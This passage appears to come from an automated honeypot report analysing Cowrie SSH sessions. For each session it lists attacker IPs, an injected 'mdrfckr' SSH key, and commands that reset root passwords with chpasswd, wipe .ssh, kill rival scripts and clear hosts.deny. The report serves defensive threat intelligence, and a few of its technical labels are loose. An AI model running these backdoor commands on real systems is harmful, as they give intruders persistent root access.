- Injected RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: **oiI5p4lPeiK2**  

**5. Threat Level:** High – the attacker has full root access, can execute arbitrary commands, and potentially exfiltrate data or install malware.

**6. Brief Summary:**  
The attacker injected a hard‑coded SSH key and reset the root password to establish persistent privileged remote access on the honeypot system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:oiI5p4lPeiK2"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: cf2cf939d31b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 187.110.238.50

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote shell access to the system (likely for further exploitation or command execution).  

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` – hide and lock `.ssh` directory.  
- Creation of `.ssh`, setting restrictive permissions (`chmod go=`).  
- Injection of a public SSH key into `authorized_keys`.  
- Attempt to change the root password via `passwd` (echoing passwords).  
- System reconnaissance commands: CPU info, memory usage, file listings, crontab, user info, etc.  

**Indicators of Compromise (IOCs):**
- Attacker IP: **187.110.238.50** (Brazil)  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...` (could be hashed or used for detection).  

**Threat Level:** **High** – the attacker successfully installed a backdoor and attempted to modify system credentials, enabling persistent remote access.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh/authorized_keys`, locked the directory, and tried to change the root password, effectively establishing a potential remote shell foothold while gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\naXn60Q8p5EgQ\naXn60Q8p5EgQ"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\naXn60Q8p5EgQ\naXn60Q8p5EgQ\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: bea17f17c8ae...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 196.28.242.198

#### Analysis

**Attack Type:**  
Backdoor installation with reconnaissance (SSH key injection + system information gathering)

**Objective:**  
Create a persistent remote access point via an SSH key while collecting system details to assess the target’s environment.

**Techniques Used:**
- **SSH Key Injection** – `echo … | > .ssh/authorized_keys` and chmod changes
- **Password Manipulation** – piping password strings into `passwd`
- **System Reconnaissance** – commands querying CPU, memory, OS details (`cat /proc/cpuinfo`, `uname`, `lscpu`, `df`, etc.)

**Indicators of Compromise (IOCs):**
- Attacker IP: 196.28.242.198
- SSH key string in `.ssh/authorized_keys`:  
`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`
- File path: `.ssh/authorized_keys`

**Threat Level:** Medium – the attacker successfully establishes a backdoor and gathers system info, but no evidence of malware download or exploitation.

**Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `~/.ssh` directory, attempted to change passwords, and performed extensive system reconnaissance. This indicates a backdoor installation with potential for remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "yuxiang\n7fsRx5bHsjXw\n7fsRx5bHsjXw"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "yuxiang\n7fsRx5bHsjXw\n7fsRx5bHsjXw\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 0809d91c856a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 41.58.186.130

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root credential compromise)

**Objective:** Gain persistent remote access via SSH and elevate privileges to root on the target host.

**Techniques:**
- `chattr -ia`, `lockr` – attempt to lock `.ssh` directory.
- Creation of a new `.ssh` directory, writing an RSA public key into `authorized_keys`.
- `chmod -R go= ~/.ssh` – restrict permissions.
- `echo "root:XDnTH4TJx6ow"|chpasswd|bash` – set root password to a known value.
- System‑information commands (`cat /proc/cpuinfo`, `free`, `uname`, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **41.58.186.130**  
- SSH public key string: *`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`*  
- File path: `.ssh/authorized_keys`

**Threat Level:** **High** – root password reset and SSH key injection provide full control over the system.

**Brief Summary:** The attacker injected an SSH public key into the target’s `authorized_keys`, changed the root password to a known value, and performed system reconnaissance, effectively establishing a backdoor for remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:XDnTH4TJx6ow"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 01a82cb38e0a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 187.110.238.50

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise – the attacker is attempting to gain persistent remote access via SSH and elevate privileges.

**2. Objective:**  
- Inject a new SSH public key into `~/.ssh/authorized_keys` so that the attacker can log in as root or any user.
- Reset the root password (`root:fF2SDu0CT8QS`) to enable direct root login.
- Hide or terminate suspicious processes (e.g., `secure.sh`, `auth.sh`, `sleep`) and block host access via `/etc/hosts.deny`.

**3. Techniques & Tools:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`, `chmod`).
- Direct injection of an RSA public key into `authorized_keys`.
- Password change via `chpasswd`.
- Process termination with `pkill -9`.
- System reconnaissance: CPU info, memory usage, uptime (`top`, `uname`, `whoami`, etc.).

**4. Indicators of Compromise (IOCs):**  
- Attacker IP: **187.110.238.50** (Brazil).  
- RSA public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`.  
- File: `~/.ssh/authorized_keys`.

**5. Threat Level:** **High** – root credential compromise and SSH backdoor installation pose significant risk.

**6. Brief Summary:**  
The attacker injected an SSH key and reset the root password, establishing a persistent backdoor for remote control while gathering system information to aid future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:fF2SDu0CT8QS"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: bc6f310d88ca...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.163.173

#### Analysis

**Attack Type:** Backdoor installation / SSH key injection  
**Objective:** Gain unauthorized SSH access to the system by adding a valid public‑key entry in `~/.ssh/authorized_keys`.  

**Techniques & Tools Used:**
- `chattr -ia .ssh` and `lockr -ia .ssh` to attempt immutability of the `.ssh` directory.  
- Creation of `.ssh` directory, removal of existing one, and writing a new SSH key (`echo … > ~/.ssh/authorized_keys`).  
- Permission changes (`chmod -R go= ~/.ssh`) to restrict access.  

**Indicators of Compromise (IOCs):**
- Attacker IP: **101.47.163.173**  
- SSH public‑key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...` (the full key can be hashed for detection).  
- File path: `~/.ssh/authorized_keys`.  

**Threat Level:** Medium – the attacker is attempting to establish a remote backdoor, which could allow future exploitation.  

**Brief Summary:** The attacker injected an unauthorized SSH public‑key into the honeypot’s `.ssh` directory, aiming to create a persistent remote access point.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nLbIKbcZZbFEh\nLbIKbcZZbFEh"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nLbIKbcZZbFEh\nLbIKbcZZbFEh\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+9 more)
```

---

### Pattern: e56d84116c51...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.231.14.54

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote access to the system (root privileges)  
**Techniques:**  
- Injected a public‑key into `~/.ssh/authorized_keys`  
- Changed root password (`chpasswd`)  
- Removed temporary scripts and killed processes (`pkill -9`)  
- Modified `/etc/hosts.deny` to block unwanted connections  
- Collected system information (CPU, memory, disk usage) for reconnaissance  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.231.14.54** (Hong Kong)  
- Public key string in `authorized_keys`: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Files manipulated: `~/.ssh`, `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`

**Threat Level:** **High** – attacker successfully installed a backdoor with root access and attempted to conceal activity.

**Brief Summary:** The attacker injected an SSH key, changed the root password, and removed temporary scripts to establish a persistent remote access backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:NXHEVvAwcWum"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 097b0263f5ed...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 41.58.186.130

#### Analysis

**Attack Type:** Backdoor installation – the attacker is setting up a persistent SSH entry and root credentials for future remote access.  

**Objective:** Gain full administrative (root) control over the target system via SSH.  

**Techniques & Tools:**
- Creation of `.ssh` directory, injection of an RSA public key into `authorized_keys`.  
- Setting the root password with `chpasswd`.  
- Adjusting file permissions (`chmod -R go= ~/.ssh`).  
- Killing processes and clearing temporary files to hide activity.  

**Indicators of Compromise (IOCs):**
- IP: **41.58.186.130** (Nigeria).  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"**.  
- Root password: **t17jcz6vgSAH**.  

**Threat Level:** High – the attacker has achieved root access, enabling full control and potential exploitation of the system.

**Brief Summary:** The session shows a malicious actor installing an SSH backdoor with a custom public key and resetting the root password, thereby securing persistent remote administrative access to the target machine.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:t17jcz6vgSAH"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: ccaf82991731...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 41.58.186.130

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root password alteration) with reconnaissance  
**Objective:** Gain persistent remote access and control the host; gather system details for further exploitation or profiling.  
**Techniques:**  
- `chattr -ia`/`lockr -ia` to hide files,  
- SSH key creation (`echo ... > ~/.ssh/authorized_keys`) and permission changes,  
- `chpasswd` to set root password,  
- Process killing (`pkill -9 …`) and host denial modification.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: 41.58.186.130 (Nigeria)  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Files: `/tmp/secure.sh`, `/tmp/auth.sh`, `hosts.deny`.  
**Threat Level:** High – sophisticated backdoor with root access and system reconnaissance.  
**Brief Summary:** The attacker injected an SSH key, set the root password, hid files, killed processes, and collected CPU/memory info to establish a persistent backdoor on the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:j9aEzwrKb8Hh"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: a7e62ff8b372...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 185.203.236.212

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged (root) access via SSH and modify system settings to facilitate future exploitation.  

**Techniques & Tools Used:**
- **SSH key injection** – `echo "ssh‑rsa …" >> .ssh/authorized_keys`  
- **Root password change** – `echo "root:RFlnz7sI0n3m"|chpasswd|bash`  
- **Process killing / cleanup** – `pkill -9 secure.sh; pkill -9 auth.sh; pkill -9 sleep`  
- **System reconnaissance** – various `/proc/cpuinfo`, `uname`, `top`, `df` commands.  

**Indicators of Compromise (IOCs):**
- Attacker IP: 185.203.236.212 (Uzbekistan)  
- RSA key string in authorized_keys (`ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…`)  
- File paths: `.ssh/authorized_keys`, `/etc/hosts.deny`  
- Process names targeted: `secure.sh`, `auth.sh`, `sleep`.  

**Threat Level:** **High** – attacker successfully injected SSH credentials and altered root password, enabling persistent privileged access.  

**Brief Summary:** The session shows an attacker installing a backdoor by injecting an SSH key and changing the root password, while gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:RFlnz7sI0n3m"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 569ec6b1046c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.225.253.26

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain remote control via SSH by inserting a malicious key and resetting the root password.  

**Techniques Used:**  
- `chattr -ia` & `lockr -ia` to lock `.ssh` directory.  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA key.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `echo "root:tGVrkSZnWyZc"|chpasswd|bash` to change root password.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **14.225.253.26** (Vietnam).  
- RSA key string in `/ssh/authorized_keys`.  
- Root password hash “tGVrkSZnWyZc”.  

**Threat Level:** **High** – persistent remote access with elevated privileges.  

**Brief Summary:** The attacker injected a malicious SSH key and reset the root password, establishing a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:tGVrkSZnWyZc"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: e378a29d1334...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 154.92.14.191

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root credential compromise)

**Objective:** Gain persistent remote access to the machine via SSH and elevate privileges (root).

**Techniques:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`)  
- Injection of a public‑key into `authorized_keys`  
- Password reset for root using `chpasswd`  
- Process termination (`pkill –9`) and disabling host denial (`echo > /etc/hosts.deny`)  
- System reconnaissance (CPU, memory, OS info)

**Indicators of Compromise (IOCs):**
- Attacker IP: **154.92.14.191** (Hong Kong)  
- Public‑key string in `authorized_keys`  
- Root password change command (`echo "root:qzLFHVgFAUyD"|chpasswd|bash`)  

**Threat Level:** **High** – attacker successfully establishes a privileged SSH backdoor and modifies system security settings.

**Brief Summary:** The attacker injected an SSH key, reset the root password, and disabled host‑deny rules to create a persistent, high‑privilege remote access point while collecting system information for further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:qzLFHVgFAUyD"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: bf5b070fefb7...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 196.28.242.198

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root credential takeover)

**Objective:** Gain persistent remote access to the honeypot by creating an SSH key for the attacker’s account and resetting the root password.

**Techniques Used:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` creates a new RSA key.
- **Root Password Change** – `chpasswd` sets the root password to “7Hvu5Eu0PHW1”.
- **Process & File Manipulation** – removal of temporary scripts, killing processes (`pkill -9`), and modifying `/etc/hosts.deny`.
- **System Reconnaissance** – gathering CPU/memory info, system details (uname, lscpu, df, top).

**Indicators of Compromise (IOCs):**
- Attacker IP: 196.28.242.198
- RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`
- Root password: `7Hvu5Eu0PHW1`
- File path: `.ssh/authorized_keys`

**Threat Level:** **High** – root access and SSH backdoor provide full control over the system.

**Brief Summary:** The attacker installed an SSH backdoor by adding a new RSA key to the authorized keys file and resetting the root password, enabling remote exploitation of the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:7Hvu5Eu0PHW1"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: dbc142f98474...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.172.205.208

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain privileged access (root) via SSH key injection and password change, then gather system details to assess target suitability.  

**Techniques & Tools:**
- `echo` into `.ssh/authorized_keys` – SSH key injection  
- `chpasswd` – root password reset (`ixOUN9atwtth`)  
- `chmod -R go= ~/.ssh` – restrict permissions on SSH directory  
- `lockr -ia .ssh` – likely a tool to lock file attributes (prevent tampering)  
- System‑info commands (`cat /proc/cpuinfo`, `free`, `uname`, `top`, etc.) for reconnaissance  

**Indicators of Compromise (IOCs):**
- **SSH Key:**

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ixOUN9atwtth"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 9257bf6048bf...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.231.14.54

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root password) with subsequent reconnaissance  
**Objective:** Gain persistent remote access as root on the target machine.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to lock `.ssh` directory attributes.  
